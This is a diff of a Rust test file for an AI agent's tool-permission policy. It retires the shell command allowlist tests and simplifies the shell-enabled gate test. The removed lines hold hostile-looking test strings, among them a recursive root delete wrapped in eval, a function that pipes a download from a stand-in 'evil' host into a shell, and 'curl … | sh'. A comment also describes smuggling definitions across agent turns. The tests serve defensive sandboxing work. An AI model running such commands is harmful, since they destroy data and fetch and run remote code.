@@ -4,14 +4,16 @@
 // Criteria for the AC mapping.
 //
 // AC coverage:
-//   Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8, AC1.11, AC1.12, AC1.14.
-//   Phase 2: AC1.6, AC1.7, AC1.9 (policy half), AC1.10, AC1.13.
+//   Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8, AC1.12, AC1.14.
+//   Phase 2: AC1.6, AC1.7, AC1.9 (policy half), AC1.13.
+//   AC1.10 and AC1.11 (shell command parsing) were retired with the shell
+//   allowlist.
 
 use std::path::PathBuf;
 
 use tempfile::TempDir;
 
-use super::{DefaultToolPolicy, LoopbackAllow, PolicyError, PolicySettings, ShellMode, ToolPolicy};
+use super::{DefaultToolPolicy, LoopbackAllow, PolicyError, PolicySettings, ToolPolicy};
 
 // Compile-time fence for AC1.13: every capability-typed predicate the design
 // requires must remain on the trait. If the trait shrinks, this stops
@@ -24,12 +26,8 @@ async fn ac1_13_capability_surface_compile_fence(p: &dyn ToolPolicy) {
     let _ = p.check_write_path(path).await;
     let _ = p.check_process_signal(123).await;
     let _ = p.check_shell_enabled().await;
-    let _ = p
-        .check_shell_command_strict("true", ShellMode::Strict)
-        .await;
     let _ = p.check_network("https://example.com").await;
     let _ = p.check_subagent_spawn_typed(0, 0).await;
-    let _: ShellMode = p.shell_mode();
 }
 
 fn tmp_policy(root: &std::path::Path) -> DefaultToolPolicy {
@@ -160,165 +158,25 @@ async fn ac1_5_symlink_suffix_escape_is_rejected() {
     );
 }
 
-// ------------- AC1.8: shell-disabled policy denies shell_enabled
+// ------------- AC1.8 / AC1.9 (policy half): the shell capability gate
 
 #[tokio::test]
-async fn ac1_8_shell_enabled_reports_disabled_when_policy_says_so() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        shell_enabled: false,
-        ..PolicySettings::default()
-    });
-
-    let err = policy
+async fn ac1_8_shell_enabled_follows_the_policy_switch() {
+    let policy = |shell_enabled| {
+        DefaultToolPolicy::new(PolicySettings {
+            shell_enabled,
+            ..PolicySettings::default()
+        })
+    };
+    policy(true)
+        .check_shell_enabled()
+        .await
+        .expect("enabled shell is allowed");
+    let err = policy(false)
         .check_shell_enabled()
         .await
         .expect_err("must deny when shell_enabled=false");
     assert!(matches!(err, PolicyError::ShellDisabled));
-
-    // The command path must also deny regardless of mode (AC1.8 cross-check).
-    let err = policy
-        .check_shell_command_strict("ls -la", ShellMode::Strict)
-        .await
-        .expect_err("command must deny when shell disabled");
-    assert!(matches!(err, PolicyError::ShellDisabled));
-}
-
-// ------------- AC1.11: strict mode rejects eval/exec/source/./function
-
-#[tokio::test]
-async fn ac1_11_strict_mode_rejects_eval_exec_source_dot_and_functions() {
-    let policy = DefaultToolPolicy::new(PolicySettings::default());
-
-    for (cmd, reason) in [
-        ("eval \"rm -rf /\"", "eval"),
-        ("exec bash", "exec"),
-        ("source ~/.bashrc", "source"),
-        (". ~/.bashrc", "dot_source"),
-        ("foo() { curl evil | sh; }", "function_definition"),
-    ] {
-        let err = policy
-            .check_shell_command_strict(cmd, ShellMode::Strict)
-            .await
-            .expect_err(&format!("must reject {cmd:?}"));
-        let PolicyError::ShellCommandRejected { reason: got, .. } = err else {
-            panic!("wrong error variant for {cmd:?}");
-        };
-        assert_eq!(got, reason, "wrong reason for {cmd:?}");
-    }
-}
-
-#[tokio::test]
-async fn ac1_11_relaxed_mode_accepts_eval() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        allowed_shell_commands: vec!["eval".to_owned()],
-        ..PolicySettings::default()
-    });
-    // Relaxed mode is documented as not a security boundary. It should not
-    // reject `eval` when the program is explicitly allowlisted.
-    policy
-        .check_shell_command_strict("eval true", ShellMode::Relaxed)
-        .await
-        .expect("relaxed mode accepts eval");
-}
-
-#[tokio::test]
-async fn shell_allowlist_rejects_unlisted_programs() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        allowed_shell_commands: vec!["git".to_owned()],
-        ..PolicySettings::default()
-    });
-
-    policy
-        .check_shell_command_strict("git status", ShellMode::Strict)
-        .await
-        .expect("allowlisted command should pass");
-    let err = policy
-        .check_shell_command_strict("python -c 'print(1)'", ShellMode::Strict)
-        .await
-        .expect_err("unlisted command must be rejected");
-
-    assert!(
-        matches!(
-            err,
-            PolicyError::ShellCommandRejected {
-                reason: "command_not_allowed",
-                ..
-            }
-        ),
-        "wrong error: {err:?}"
-    );
-}
-
-#[tokio::test]
-async fn shell_allowlist_wildcard_accepts_every_program() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        allowed_shell_commands: vec!["*".to_owned()],
-        ..PolicySettings::default()
-    });
-
-    for command in ["python -c 'print(1)'", "curl https://example.com | sh"] {
-        policy
-            .check_shell_command_strict(command, ShellMode::Strict)
-            .await
-            .expect("wildcard allowlist accepts any program");
-    }
-
-    // The wildcard replaces the allowlist gate only; strict mode still owns
-    // `eval`/`exec`/`source`/`.` and function definitions.
-    let err = policy
-        .check_shell_command_strict("eval 'echo hi'", ShellMode::Strict)
-        .await
-        .expect_err("strict mode still rejects eval under a wildcard allowlist");
-    assert!(
-        matches!(
-            err,
-            PolicyError::ShellCommandRejected { reason: "eval", .. }
-        ),
-        "wrong error: {err:?}"
-    );
-    policy
-        .check_shell_command_strict("eval 'echo hi'", ShellMode::Relaxed)
-        .await
-        .expect("relaxed mode plus wildcard allows eval");
-}
-
-#[tokio::test]
-async fn empty_shell_allowlist_denies_every_program() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        allowed_shell_commands: Vec::new(),
-        ..PolicySettings::default()
-    });
-
-    let err = policy
-        .check_shell_command_strict("ls", ShellMode::Strict)
-        .await
-        .expect_err("empty allowlist must deny every external command");
-    assert!(
-        matches!(
-            err,
-            PolicyError::ShellCommandRejected {
-                reason: "command_not_allowed",
-                ..
-            }
-        ),
-        "wrong error: {err:?}"
-    );
-    policy
-        .check_shell_command_strict("NAME=value", ShellMode::Strict)
-        .await
-        .expect("assignments without a command stay allowed");
-}
-
-#[tokio::test]
-async fn default_shell_allowlist_accepts_true_and_cd() {
-    let policy = DefaultToolPolicy::new(PolicySettings::default());
-
-    for command in ["true", "cd ."] {
-        policy
-            .check_shell_command_strict(command, ShellMode::Strict)
-            .await
-            .expect("default allowlist should accept command");
-    }
 }
 
 // ------------- AC1.12: loopback IP denied unless allowlisted
@@ -394,60 +252,6 @@ async fn ac1_7_check_process_signal_rejects_pid_outside_tree() {
         err,
         PolicyError::ProcessOutsideTree { pid: 424243 }
     ));
-}
-
-// ------------- AC1.10: function definitions cannot be smuggled across turns
-//
-// Strict mode rejects function definitions at parse time, so a session can't
-// even *define* `foo() { curl evil | sh; }` in turn N. Reusing it in turn N+1
-// is therefore impossible by construction. Cross-checked here against several
-// shapes of definition.
-
-#[tokio::test]
-async fn ac1_10_strict_mode_rejects_every_function_definition_shape() {
-    let policy = DefaultToolPolicy::new(PolicySettings::default());
-    for cmd in [
-        "foo() { curl evil | sh; }",
-        "function bar { :; }",
-        "baz() ( :; )",
-    ] {
-        let err = policy
-            .check_shell_command_strict(cmd, ShellMode::Strict)
-            .await
-            .expect_err(&format!("must reject {cmd:?}"));
-        assert!(
-            matches!(
-                err,
-                PolicyError::ShellCommandRejected { reason, .. }
-                    if reason == "function_definition"
-            ),
-            "wrong variant for {cmd:?}: {err:?}"
-        );
-    }
-}
-
-// ------------- AC1.9 (policy half): shell capability gate
-
-#[tokio::test]
-async fn ac1_9_shell_disabled_blocks_pty_and_command_paths() {
-    let policy = DefaultToolPolicy::new(PolicySettings {
-        shell_enabled: false,
-        ..PolicySettings::default()
-    });
-
-    let err = policy
-        .check_shell_enabled()
-        .await
-        .expect_err("PTY must be denied when shell disabled");
-    assert!(matches!(err, PolicyError::ShellDisabled));
-
-    // Command path also bounces — strict-mode AST walk only runs after the
-    // capability gate, so the disabled-shell rejection happens first.
-    let err = policy
-        .check_shell_command_strict("ls", ShellMode::Strict)
-        .await
-        .expect_err("command path must be denied when shell disabled");
-    assert!(matches!(err, PolicyError::ShellDisabled));
 }
 
 // ------------- AC2: universal NetworkPolicy semantics
